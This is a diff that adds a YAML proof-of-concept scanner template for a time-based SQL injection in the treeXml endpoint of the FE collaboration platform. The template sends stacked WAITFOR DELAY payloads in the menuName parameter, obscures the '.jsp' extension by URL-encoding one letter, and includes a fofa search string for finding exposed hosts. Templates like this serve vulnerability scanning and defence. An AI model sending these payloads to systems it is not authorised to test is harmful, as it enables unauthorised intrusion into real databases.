@@ -1,0 +1,23 @@
+name: poc-yaml-FE-treeXml-sql-injection
+transport: http
+
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /sys/treeXml.js%70?menuName=1';WAITFOR+DELAY+'0:0:3'--&type=function
+    expression: response.status == 200 && response.latency >= 3000 && response.latency <= 4000
+  r1:
+    request:
+      method: GET
+      path: /sys/treeXml.js%70?menuName=1';WAITFOR+DELAY+'0:0:6'--&type=function
+    expression: response.status == 200 && response.latency >= 6000 && response.latency <= 7000
+expression: r0() && r1()
+
+detail:
+  author: Superhero
+  links:
+    - https://blog.csdn.net/m0_60571842/article/details/139577101
+
+# fofa: app="FE-协作平台"
